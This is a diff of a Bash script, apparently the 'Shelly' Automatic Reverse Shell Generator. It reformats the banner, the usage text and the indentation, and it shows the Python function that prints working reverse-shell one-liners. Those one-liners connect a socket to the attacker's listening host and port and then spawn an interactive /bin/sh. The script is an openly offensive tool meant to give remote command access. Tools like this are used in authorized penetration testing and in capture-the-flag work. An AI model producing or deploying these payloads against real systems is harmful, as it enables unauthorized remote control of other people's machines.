@@ -34,10 +34,10 @@ declare -r f22='Php'
 declare -r f23='Awk'
 declare -r f24='Xterm'
 declare -r f25='Gawk'
-declare -r f26='\'
-declare -r f27='┌════════════════════════════════════════════┐'
-declare -r f28='└════════════════════════════════════════════┘'
-declare -r f29='║'
+declare -r f26='==============================================================='
+declare -r f27=''
+declare -r f28=''
+declare -r f29='Automatic Reverse Shell Generator'
 declare -r int="$1"
 declare -r lp="$2"
 declare -r def="$3"
@@ -45,44 +45,46 @@ declare -r lh=$(ip -4 address show $int | grep 'inet' | awk '{print $2}' | cut -
 
 function banner(){
 	echo ""	
-	echo -e "$White$f27"	
-	echo -e "$White$f29$CyanLight   _________.__           .__  .__          $White$f29";
-	echo -e "$White$f29$CyanLight  /   _____/|  |__   ____ |  | |  | ___.__. $White$f29";
-	echo -e "$White$f29$CyanLight  \_____  \ |  |  \_/ __ \|  | |  |<   |  | $White$f29";
-	echo -e "$White$f29$CyanLight  /        \|   Y  \  ___/|  |_|  |_\___  | $White$f29";
-	echo -e "$White$f29$CyanLight /_______  /|___|  /\___  >____/____/ ____| $White$f29";
-	echo -e "$White$f29$CyanLight         \/      \/     \/          \/      $White$f29";
-	echo -e "$White$f28                                                            $End";
-	echo ""
+	echo -e "$White$f26                                            $End";	
+	echo -e "$CyanLight   _________.__           .__  .__          $End";
+	echo -e "$CyanLight  /   _____/|  |__   ____ |  | |  | ___.__. $End";
+	echo -e "$CyanLight  \_____  \ |  |  \_/ __ \|  | |  |<   |  | $End";
+	echo -e "$CyanLight  /        \|   Y  \  ___/|  |_|  |_\___  | $End";
+	echo -e "$CyanLight /_______  /|___|  /\___  >____/____/ ____| $End";
+	echo -e "$CyanLight         \/      \/     \/          \/      $End";
+	echo -e "$GreenLight     $f29								   $End";
+	echo -e "$White$f26                                            $End";
 }
 
 function main(){
-  echo -e "$White$f1$YellowLight$f3$White$f2$GreenLight Usage:$YellowLight Shelly $White$f4$RedLight$f10$White$f5 $White$f4$RedLight$f11$White$f5$End $White$f4$RedLight$f9$White$f5$End"
-  echo ""
+	echo ""
+	echo -e "$White$f1$RedLight$f6$White$f2$GreenLight Author:$RedLight   d4t4s3c$End"
+   	echo -e "$White$f1$YellowLight$f3$White$f2$GreenLight Example:$YellowLight  Shelly $White$f4$RedLight$f10$White$f5 $White$f4$RedLight$f11$White$f5$End $White$f4$RedLight$f9$White$f5$End"
+    	echo ""
 }
 
 if [ ! -z $int ]; then
 	sleep 0.5
 else
 	banner
-	main
- 	exit 0
+    	main
+    	exit 0
 fi
 
 if [ ! -z $lp ]; then
     	sleep 0.5
 else
 	banner
-  	main
-  	exit 0
+    	main
+    	exit 0
 fi
 
 if [ ! -z $def ]; then
     	sleep 0.5
 else
-  	banner
-  	main
-  	exit 0
+	banner
+    	main
+    	exit 0
 fi
 
 function bash(){
@@ -154,18 +156,18 @@ function xterm(){
 
 function python(){
 	echo ""
-  	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f14$End"
-  	echo ""
-  	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
-  	echo ""
-  	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
-  	echo ""
-  	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f15$End"
-  	echo ""
-  	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
-  	echo ""
-  	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
-  	echo ""
+    	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f14$End"
+    	echo ""
+    	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+    	echo ""
+    	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
+    	echo ""
+    	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f15$End"
+    	echo ""
+    	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+    	echo ""
+    	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
+    	echo ""
 }
 
 function perl(){
@@ -235,37 +237,65 @@ function ruby(){
 }
 
 function start(){
+		echo ""
+		echo -e "$White$f26$End"
 	if [ "$def" == "bash" ] || [ "$def" == "Bash" ]; then
 		bash
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "netcat" ] || [ "$def" == "Netcat" ]; then
 		netcat
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "php" ] || [ "$def" == "Php" ]; then
 		php
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "ncat" ] || [ "$def" == "Ncat" ]; then
 		ncat
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "python" ] || [ "$def" == "Python" ]; then
 		python
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "perl" ] || [ "$def" == "Perl" ]; then
 		perl
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "telnet" ] || [ "$def" == "Telnet" ]; then
 		telnet
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "powershell" ] || [ "$def" == "PowerShell" ]; then
 		powershell
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "awk" ] || [ "$def" == "Awk" ]; then
 		awk
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "gawk" ] || [ "$def" == "Gawk" ]; then
 		gawk
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "socat" ] || [ "$def" == "Socat" ]; then
 		socat
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "ruby" ] || [ "$def" == "Ruby" ]; then
 		ruby
+		echo ""
+		echo -e "$White$f26$End"
 	elif [ "$def" == "xterm" ] || [ "$def" == "Xterm" ]; then
 		xterm
-    	else
-    		banner
+		echo ""
+		echo -e "$White$f26$End"
+    else
+ 		banner
     		main
     		exit 0
-    	fi
+    fi
 }
 
 start
